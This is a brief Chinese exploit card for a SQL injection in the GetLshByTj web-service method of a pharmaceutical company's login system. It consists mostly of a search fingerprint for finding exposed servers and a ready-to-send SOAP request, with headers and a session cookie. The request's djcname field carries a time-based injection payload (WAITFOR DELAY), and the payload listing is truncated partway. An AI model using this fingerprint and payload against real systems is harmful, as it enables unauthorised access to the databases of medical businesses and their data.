# 医药公司登录系统GetLshByTj存在SQL注入漏洞

- **系统**：医药公司登录系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="ResourceScripts/zh-cn-Login.aspx.js"`
- **请求**：`POST /WebService.asmx HTTP/1.1`
- **关键头**：`Cookie: _sid=tp_1700221267_fbf3ff64ee297b12`　`Priority: u=1`　`SOAPAction: http://tempuri.org/GetLshByTj`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 454`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:GetLshByTj>
<!--type: string-->
<tem:tjstr>gero et</tem:tjstr>
<!--type: string-->
<tem:djcname>onoras imperio';WAITFOR DELAY '0:0:5'--</tem:djcname>
<!--type: boolean-->
<tem:redonly>true</tem:redonly>
</tem:GetLshByTj>
</soapenv:Body>
</soapenv:Envelope>
POST /WebService.asmx HTTP/1.1
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
Priority: u=1
SOAPAction: http://tempuri.org/GetLshByTj
Content-Type: text/xml;charset=UTF-8
Host:
Content-Length: 478
<s…（脚本共 976 字，完整版见原文）
```

**其他**
- 医药公司登录系统GetLshByTj存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 医药公司登录系统